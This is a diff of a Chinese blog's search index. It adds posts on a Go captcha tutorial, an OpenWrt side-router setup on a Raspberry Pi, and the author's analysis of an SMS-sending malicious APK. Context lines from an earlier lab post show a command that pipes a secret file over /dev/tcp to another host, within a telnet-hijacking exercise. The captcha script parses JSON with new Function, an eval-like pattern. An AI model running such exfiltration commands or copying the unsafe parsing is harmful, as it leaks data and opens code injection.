@@ -1,6 +1,213 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>golang使用base64Captcha做图形验证码并支持点击刷新</title>
+    <url>/posts/abbfff54/</url>
+    <content><![CDATA[<p>很多go的web框架都自带图形验证码，比如macaron和gin，但是这些验证码模块的验证码都比较弱，只能使用纯数字作为验证码，此处介绍base64Captcha包的使用方法并支持点击刷新。</p>
+<a id="more"></a>
+<ul>
+<li>
+<p>首先下载</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">go get &quot;github.com&#x2F;mojocn&#x2F;base64Captcha&quot;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li>
+<p>测试代码</p>
+<p>目录结构如下</p>
+<p><img src="/images/loading.gif" data-original="/posts/abbfff54/image-20220512134757796.png" alt="image-20220512134757796"></p>
+<p>main.go</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GO"><figure class="iseeu highlight /go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"html/template"</span></span><br><span class="line">	<span class="string">"image/color"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/go-macaron/session"</span></span><br><span class="line">	<span class="string">"github.com/mojocn/base64Captcha"</span></span><br><span class="line">	<span class="string">"gopkg.in/macaron.v1"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置自带的 store（可以配置成redis）</span></span><br><span class="line"><span class="keyword">var</span> store base64Captcha.Store</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	store = base64Captcha.DefaultMemStore</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取验证码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MakeCaptcha</span><span class="params">()</span> <span class="params">(id, b64s <span class="keyword">string</span>, err error)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> driver base64Captcha.Driver</span><br><span class="line">	<span class="comment">//配置验证码的参数</span></span><br><span class="line">	driverString := base64Captcha.DriverString&#123;</span><br><span class="line">		Height:          <span class="number">60</span>,</span><br><span class="line">		Width:           <span class="number">120</span>,</span><br><span class="line">		NoiseCount:      <span class="number">0</span>,</span><br><span class="line">		ShowLineOptions: <span class="number">2</span> | <span class="number">4</span>,</span><br><span class="line">		Length:          <span class="number">4</span>,</span><br><span class="line">		Source:          <span class="string">"1234567890qwertyuioplkjhgfdsazxcvbnm"</span>,</span><br><span class="line">		BgColor:         &amp;color.RGBA&#123;R: <span class="number">3</span>, G: <span class="number">102</span>, B: <span class="number">214</span>, A: <span class="number">125</span>&#125;,</span><br><span class="line">		Fonts:           []<span class="keyword">string</span>&#123;<span class="string">"wqy-microhei.ttc"</span>&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ConvertFonts 按名称加载字体</span></span><br><span class="line">	driver = driverString.ConvertFonts()</span><br><span class="line">	<span class="comment">//创建 Captcha</span></span><br><span class="line">	captcha := base64Captcha.NewCaptcha(driver, store)</span><br><span class="line">	<span class="comment">//Generate 生成随机 id、base64 图像字符串</span></span><br><span class="line">	id, b64s, err = captcha.Generate()</span><br><span class="line">	<span class="keyword">return</span> id, b64s, err</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//验证验证码</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">VerifyCaptcha</span><span class="params">(req macaron.Request)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	_ = req.ParseForm()</span><br><span class="line">  <span class="comment">// true表示验证过后删除id信息</span></span><br><span class="line">	<span class="keyword">return</span> store.Verify(req.Form.Get(<span class="string">"captcha_id"</span>), req.Form.Get(<span class="string">"captcha"</span>), <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Captcha <span class="keyword">struct</span> &#123;</span><br><span class="line">	Id        <span class="keyword">string</span> <span class="string">`json:"id"`</span></span><br><span class="line">	ImageB64s <span class="keyword">string</span> <span class="string">`json:"imageb64s"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问api</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCaptcha</span><span class="params">(ctx *macaron.Context)</span></span> &#123;</span><br><span class="line">	<span class="comment">// Reload captcha.</span></span><br><span class="line">	id, b64s, _ := MakeCaptcha()</span><br><span class="line">	ctx.JSON(<span class="number">200</span>, &amp;Captcha&#123;Id: id, ImageB64s: b64s&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	m := macaron.Classic()</span><br><span class="line">	m.Use(macaron.Renderer())</span><br><span class="line">  <span class="comment">//默认模版路径为temlplates</span></span><br><span class="line">	m.Use(session.Sessioner())</span><br><span class="line"></span><br><span class="line">	m.Get(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx *macaron.Context)</span></span> &#123;</span><br><span class="line">		id, b64s, _ := MakeCaptcha()</span><br><span class="line">		ctx.Data[<span class="string">"captcha_id"</span>] = id</span><br><span class="line">		<span class="comment">// 这边要用template.URL否则无法正常渲染 base64当作url</span></span><br><span class="line">		ctx.Data[<span class="string">"base64_image"</span>] = template.URL(b64s)</span><br><span class="line">		ctx.HTML(<span class="number">200</span>, <span class="string">"captcha"</span>)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	m.Get(<span class="string">"/captcha"</span>, GetCaptcha)</span><br><span class="line"></span><br><span class="line">	m.Post(<span class="string">"/"</span>, <span class="function"><span class="keyword">func</span><span class="params">(ctx *macaron.Context, flash *session.Flash)</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> VerifyCaptcha(ctx.Req) &#123;</span><br><span class="line">			flash.Success(<span class="string">"验证码输入正确"</span>)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			flash.Success(<span class="string">"验证码输入错误"</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		ctx.Redirect(<span class="string">"/"</span>)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	m.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+</li>
+<li>
+<p>前端代码（模版）</p>
+<p>temlplates/captcha.html</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>  <span class="attr">action</span>=<span class="string">"/"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">placeholder</span>=<span class="string">"验证码"</span> <span class="attr">name</span>=<span class="string">"captcha"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"captcha_id"</span> <span class="attr">id</span>=<span class="string">"captcha_id"</span> <span class="attr">value</span>=<span class="string">"&#123;&#123;.captcha_id&#125;&#125;"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&#123;&#123;.base64_image&#125;&#125;"</span> <span class="attr">name</span>=<span class="string">"base64_image"</span> <span class="attr">id</span>=<span class="string">"base64_image"</span> <span class="attr">onclick</span>=<span class="string">"imageFlash()"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">        &#123;&#123;if .Flash.SuccessMsg&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            &#123;&#123;.Flash.SuccessMsg&#125;&#125;</span><br><span class="line">        &#123;&#123;end&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">imageFlash</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//1.创建对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//2.指定服务器地址</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// false表示不异步，否则收不到信息</span></span></span><br><span class="line"><span class="actionscript">        xhr.open(<span class="string">'GET'</span>,<span class="string">'/captcha'</span>,<span class="literal">false</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">//3.发送</span></span></span><br><span class="line">        xhr.send();</span><br><span class="line"><span class="actionscript">        <span class="comment">//4.接收服务器 cxlget3 ok</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">if</span> (xhr.responseText!=<span class="string">""</span>)&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> info=xhr.responseText;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> func=<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"return"</span>+info);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> json=func();</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"captcha_id"</span>).value = json.id;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"base64_image"</span>).src = json.imageb64s;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li>
+<p>测试结果</p>
+<p><img src="/images/loading.gif" data-original="/posts/abbfff54/image-20220512135042832.png" alt="image-20220512135042832"></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>golang</category>
+      </categories>
+      <tags>
+        <tag>golang</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>树莓派作为旁路由安装OpenWrt</title>
+    <url>/posts/7681dc6e/</url>
+    <content><![CDATA[<p><strong>旁路由可以理解为接入在内网的一台普通机器</strong>，不管是用LAN还是WAN接入都无所谓，只要你能知道它的内网IP，在本地网络中直接编辑网关和DNS服务器指向它即可。</p>
+<p>如果想内网流量都自动经过它，则只需在主路由上的DHCP分配网关、DNS设置为旁路由即可。</p>
+<p>树莓派的硬件条件素质不够高，作为主路由性能比不上硬路由，所以可以将其作为旁路由安装软路由作为一个网关是比较合适的。</p>
+<a id="more"></a>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220502224711927.png" alt="image-20220502224711927"></p>
+<h1 id="环境介绍"><a class="markdownIt-Anchor" href="#环境介绍"></a> 环境介绍</h1>
+<p>需认证的校园网</p>
+<p>水星路由器</p>
+<p>树莓派3b+</p>
+<p>32GB tf内存卡</p>
+<p>两条网线</p>
+<h1 id="树莓派刷openwrt"><a class="markdownIt-Anchor" href="#树莓派刷openwrt"></a> 树莓派刷openwrt</h1>
+<h2 id="下载镜像"><a class="markdownIt-Anchor" href="#下载镜像"></a> 下载镜像</h2>
+<p>因为我用的3b+，所以使用的是3b+的固件</p>
+<p>去github下载（需特殊上网 懂得都懂）<br>
+链接<a href="https://github.com/SuLingGG/OpenWrt-Rpi">查看链接</a></p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430150811823.png" alt="image-20220430150811823"></p>
+<p>我下载的是这个文件</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430150857217.png" alt="image-20220430150857217"></p>
+<h1 id="进行刷机"><a class="markdownIt-Anchor" href="#进行刷机"></a> 进行刷机</h1>
+<p>使用跨平台镜像读写软件balenaEthcher进行刷机</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430151020019.png" alt="image-20220430151020019"></p>
+<p>速度很快，一下就写完了</p>
+<h1 id="配置openwrt"><a class="markdownIt-Anchor" href="#配置openwrt"></a> 配置openwrt</h1>
+<h3 id="连接到树莓派"><a class="markdownIt-Anchor" href="#连接到树莓派"></a> 连接到树莓派</h3>
+<p>刷机后将tf卡插到树莓派，插上电源，等待一段时间，期间树莓派的灯不断闪烁，过一会只有红灯亮着。然后可以通过电脑发现名为<code>OpenWrt</code>的wifi，连接上，然后电脑访问<code>http://192.168.1.1</code>，初始账号密码为root password</p>
+<h3 id="初始化网络配置"><a class="markdownIt-Anchor" href="#初始化网络配置"></a> 初始化网络配置</h3>
+<ul>
+<li>
+<p>首先确认树莓派的上级网段，确认当前环境的上网设备，比如家庭路由器或者实验室的路由器等，进入其设置界面，查看其局域网网段，并查看网段中已经占用的IP，之后任意选择一个未占用的IP（网段IP以<code>192.168.1.1</code>为例，假设IP<code>192.168.1.250</code>未被占用）</p>
+<ul>
+<li>更简单的方法是，查看自己的上网设备（手机，笔记本）的IP，得到网段IP，之后任选一个比较靠后的IP（网段IP以<code>192.168.1.1</code>为例，则可选IP是<code>192.168.1.x</code> x为2-254），然后尝试<code>ping</code>此IP，或者使用其他方式确定此IP未被占用</li>
+</ul>
+</li>
+<li>
+<p>在树莓派OpenWrt shell环境中执行</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">uci set network.lan.ipaddr=192.168.1.250</span><br><span class="line">uci commit network</span><br><span class="line">/etc/init.d/network restart</span><br></pre></td></tr></table></figure></div>
+</li>
+<li>
+<p>更改生效后，重新连接OpenWrt WiFi后，在浏览器进入OpenWrt管理界面，访问<code>192.168.1.250</code>，用户名<code>root</code>，密码<code>password</code>，进入控制面板后，在 “⽹络 - 接⼝ - Lan - 修改” 中进⾏以下设置：</p>
+</li>
+</ul>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430152518735.png" alt="image-20220430152518735"></p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430152852270.png" alt="image-20220430152852270"></p>
+<p>上述参数填写完毕后，点击<code>保存&amp;应用</code></p>
+<h1 id="部署完毕"><a class="markdownIt-Anchor" href="#部署完毕"></a> 部署完毕</h1>
+<ul>
+<li>树莓派断电，使用网线连接家庭路由器或者实验室路由器的LAN 口到树莓派的网口（<strong>在此之前，树莓派不应该使用网线连接到路由器</strong>），树莓派上电</li>
+<li>等待开启稳定后，尝试连接OpenWrt WiFi，发现可以上网了</li>
+</ul>
+<h1 id="软路由配置"><a class="markdownIt-Anchor" href="#软路由配置"></a> 软路由配置</h1>
+<p>设置路由器界面密码，其实也是ssh root的密码</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430165908162.png" alt="image-20220430165908162"></p>
+<p>设置wifi的密码</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430170048490.png" alt="image-20220430170048490"></p>
+<p>此外openclash开启自定义规则设置</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430222003416.png" alt="image-20220430222003416"></p>
+<p>禁用ipv6 dns解析</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220502113549378.png" alt="image-20220502113549378"></p>
+<h1 id="配置旁路由连接"><a class="markdownIt-Anchor" href="#配置旁路由连接"></a> 配置旁路由连接</h1>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220502225530612.png" alt="image-20220502225530612"></p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220502225551021.png" alt="image-20220502225551021"></p>
+<p>在连接中设置网关和dns server为树莓派（openwrt）的IP即可</p>
+<h1 id="推荐配置与服务"><a class="markdownIt-Anchor" href="#推荐配置与服务"></a> 推荐配置与服务</h1>
+<h2 id="配置使用openclash"><a class="markdownIt-Anchor" href="#配置使用openclash"></a> 配置使用openclash</h2>
+<p>openclash可以使通过路由器实现全局科学上网</p>
+<p>遇到的bug，之前直接用网线连接校园网，结果openwrt终端内部不能上网，这是因为校园网需要认证，所以让树莓派作为旁路由的方式连接到已经用网线连接到校园网的路由器。</p>
+<p>打开服务中的openclash</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430153338244.png" alt="image-20220430153338244"></p>
+<p>填写订阅地址后进行更新配置然后就会开始自动下载配置文件（如果树莓派直接网线连接到需要认证的校园网这步下载订阅连接就会失败）</p>
+<p>然后返回到运行状态启动OPENCLASH</p>
+<p>然后打开openclash控制面板</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430154526625.png" alt="image-20220430154526625"></p>
+<p>进行一些跟其他平台clash一样的配置，选定可用的节点</p>
+<p>重要操作：如果连接到OpenWrt的wifi，则需要将网络的网关设置为openwrt的ip，如这里需要配置为192.168.1.250</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430154145169.png" alt="image-20220430154145169"></p>
+<p>然后就可以科学上网了（如果这步不操作，则只有openwrt内部可以科学上网，而连接openwrt wifi的设备并不能生效。）</p>
+<p>可以到openclash界面查看当前对外ip</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430154352838.png" alt="image-20220430154352838"></p>
+<p>后来发现国内的网页打开比没用openclash慢</p>
+<p>于是网上搜了一下在</p>
+<p><a href="https://www.lemonbuluo.top/archives/ebe9814e/">https://www.lemonbuluo.top/archives/ebe9814e/</a></p>
+<p>找到解决方法</p>
+<p>设置openclash</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430202314882.png" alt="image-20220430202314882"></p>
+<p>设置Turbo ACC网络加速</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430203730379.png" alt="image-20220430203730379"></p>
+<h2 id="解锁网易云灰色音乐"><a class="markdownIt-Anchor" href="#解锁网易云灰色音乐"></a> 解锁网易云灰色音乐</h2>
+<ul>
+<li>安装插件</li>
+</ul>
+<p>luci-app-unblockmusic</p>
+<p>luci-i18n-unblockmusic-zh-cn</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430155156683.png" alt="image-20220430155156683"></p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430155222938.png" alt="image-20220430155222938"></p>
+<p>安装完成后执行重启</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430155310772.png" alt="image-20220430155310772"></p>
+<p>重启后可以在服务看到解锁网易云灰色音乐歌曲的服务</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430155426896.png" alt="image-20220430155426896"></p>
+<p>由于笔者使用的是macbook，需要安装CA根证书，</p>
+<p>点击下载CA根证书</p>
+<p>得到ca.crt文件</p>
+<p>然后command+空格搜索keychain Access.app然后直接打开，把ca.crt直接拉进去，此时是红色的未信任状态（笔者这边已经设置过了，所以这边是蓝色的）</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430155902844.png" alt="image-20220430155902844"></p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430155933610.png" alt="image-20220430155933610"></p>
+<p>设置完成后，启动服务</p>
+<p><img src="/images/loading.gif" data-original="/posts/7681dc6e/image-20220430160115753.png" alt="image-20220430160115753"></p>
+<p>重启macbook的网易云音乐app</p>
+<p>此时就能听那些灰色的歌曲啦！</p>
+<p>参考链接：</p>
+<p><a href="https://segmentfault.com/a/1190000039262209">https://segmentfault.com/a/1190000039262209</a></p>
+<p><a href="https://www.coolapk.com/feed/30510348?shareKey=MjM4ZjQyNDQxMzBlNjI2YmMyMmU">https://www.coolapk.com/feed/30510348?shareKey=MjM4ZjQyNDQxMzBlNjI2YmMyMmU</a></p>
+]]></content>
+      <categories>
+        <category>宽带症侯群</category>
+      </categories>
+      <tags>
+        <tag>OpenWrt</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次安卓安装恶意软件</title>
+    <url>/posts/94abfaa4/</url>
+    <content><![CDATA[<p>本文介绍了一种自动识别安卓平台下载并隐藏恶意apk包名的方法</p>
+<a id="more"></a>
+<h1 id="事情的起因"><a class="markdownIt-Anchor" href="#事情的起因"></a> 事情的起因</h1>
+<p>因为要安装xposed edge pro，就在谷歌上搜索</p>
+<p>在域名为hostapk_com（和谐掉了，防止误点击）</p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/image-20220429105749339.png" alt="image-20220429105749339"></p>
+<p>点击下载结果什么都没有发生</p>
+<p>今天打开短信，发现出现一堆垃圾短信</p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/image-20220517201739758.png" alt="image-20220517201739758"></p>
+<p>而且还都是从我的手机主动发送出去的，顿时慌了，重启手机之后短信还在发</p>
+<p>查看应用管理权限的信息权限，发现是下面这个陌生应用最近有访问信息</p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/image-20220429110500879.png" alt="image-20220429110500879"></p>
+<p>用包名查看apk查看</p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/image-20220517201757201.png" alt="image-20220517201757201"></p>
+<p>发现是昨天下载的</p>
+<p>到文件存储查看apk，发现有3.0.1版本的xpose edge pro，才发现可能是昨天点击的xposed edge下载链接</p>
+<p>查了一下话费</p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/qq_pic_merged_1651202642042.jpg" alt="qq_pic_merged_1651202642042"></p>
+<p>大无语 (;´༎ຶД༎ຶ`)，以后值敢在酷安下小软件了</p>
+<h1 id="apk文件上传"><a class="markdownIt-Anchor" href="#apk文件上传"></a> apk文件上传</h1>
+<p>用包名查看将这个恶意apk提取出安装包</p>
+<p>结果发现QQ、微信传上去后都下载不了，电脑点击之前那个恶意软件链接也无法下载，蓝牙也无法传送</p>
+<p>百度云可以成功上传但是无法下载下来</p>
+<p>压缩成原文件的压缩包再上传也不行</p>
+<p>尝试使用landrop，结果landrop上传成功后直接崩溃了，崩溃错误显示无法打开文件</p>
+<p>于是我想着用termux开个服务进行下载，上去ls发现文件名有异常</p>
+<p>其中我之前在文件存储中将显示的<code>.apk</code>改成了<code>hack.apk</code></p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/qq_pic_merged_1651203545471.jpg" alt="qq_pic_merged_1651203545471"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SH"><figure class="iseeu highlight /sh"><table><tr><td class="code"><pre><span class="line">~/.../appshow/app $ ls *.apk|xxd</span><br><span class="line">00000000: 6861 636b efbf b82e 6170 6b0a            hack....apk.</span><br><span class="line">~/.../appshow/app $ <span class="built_in">echo</span> <span class="string">"hack.apk"</span>|xxd</span><br><span class="line">00000000: 6861 636b 2e61 706b 0a                   hack.apk.</span><br></pre></td></tr></table></figure></div>
+<p>发现隐藏的字符</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">0x efbfb8</span><br></pre></td></tr></table></figure></div>
+<p>这个恶意apk软件下载网站很精明，用安卓可用而pc不可用文件名来命名文件，从而筛选操作系统</p>
+<p>用termux改了文件名之后就可以成功上传</p>
+<h1 id="分析恶意apk"><a class="markdownIt-Anchor" href="#分析恶意apk"></a> 分析恶意apk</h1>
+<p>用jadx-gui直接反编译apk文件然后搜索https继续分析</p>
+<p>找到一个接口</p>
+<p><img src="/images/loading.gif" data-original="/posts/94abfaa4/image-20220502152456842.png" alt="image-20220502152456842"></p>
+<p>这个就是自动发送短信的接口</p>
+]]></content>
+      <categories>
+        <category>信息安全</category>
+      </categories>
+      <tags>
+        <tag>安卓</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>golang之协程复用</title>
     <url>/posts/41521440/</url>
     <content><![CDATA[<p>golang是原生支持高并发的语言，它的并发是通过协程实现的，对于上千个任务，我们一般会通过将其分割成多组任务后，对于每组任务，开启对应数目的协程来运行任务。</p>
@@ -1685,9 +1892,9 @@ pq &amp;= p * q\\
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331221625653.png" alt="image-20200331221625653"></p>
 <p>靶机A输入</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;seed&#x2F;secret  &gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.121&#x2F;9090</span><br></pre></td></tr></table></figure></div>
-<p>之后靶机A显示</p>
+<p>之后靶机B显示</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331223556494.png" alt="image-20200331223556494"></p>
-<p>信息被重定向至靶机A的9090端口</p>
+<p>信息被重定向至靶机B的9090端口</p>
 <p>利用上述原理通过scapy劫持靶机B与A之间的telnet通信</p>
 <p>靶机B向靶机A发起telnet连接，在A端收到的最后一个TCP报文如下</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331225425727.png" alt="image-20200331225425727"></p>
@@ -1978,8 +2185,12 @@ pq &amp;= p * q\\
 </tr>
 </tbody>
 </table>
-<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">虚</mi><mi mathvariant="normal">拟</mi><mi mathvariant="normal">地</mi><mi mathvariant="normal">址</mi><mi mathvariant="normal">映</mi><mi mathvariant="normal">射</mi><mi mathvariant="normal">关</mi><mi mathvariant="normal">系</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">虚</mi><mi mathvariant="normal">拟</mi><mo>=</mo><mi mathvariant="normal">物</mi><mi mathvariant="normal">理</mi><mo>+</mo><mn>0</mn><mi>x</mi><mi>C</mi><mn>0000000</mn></mrow><annotation encoding="application/x-tex">虚拟地址映射关系：虚拟=物理+0xC0000000
-</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mord cjk_fallback">虚</span><span class="mord cjk_fallback">拟</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">映</span><span class="mord cjk_fallback">射</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">虚</span><span class="mord cjk_fallback">拟</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord cjk_fallback">物</span><span class="mord cjk_fallback">理</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span></span></span></span></span></p>
+<ul>
+<li>
+<p>虚拟地址映射关系：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">虚拟 &#x3D; 物理 + 0xC0000000</span><br></pre></td></tr></table></figure></div>
+</li>
+</ul>
 <p>pmm.h中有下列的宏定义函数</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分配1页空间</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> alloc_page() alloc_pages(1) </span></span><br><span class="line"><span class="comment">//释放1页空间</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> free_page(page) free_pages(page, 1)  </span></span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * PADDR - takes a kernel virtual address (an address that points above KERNBASE),</span></span><br><span class="line"><span class="comment"> * where the machine's maximum 256MB of physical memory is mapped and returns the</span></span><br><span class="line"><span class="comment"> * corresponding physical 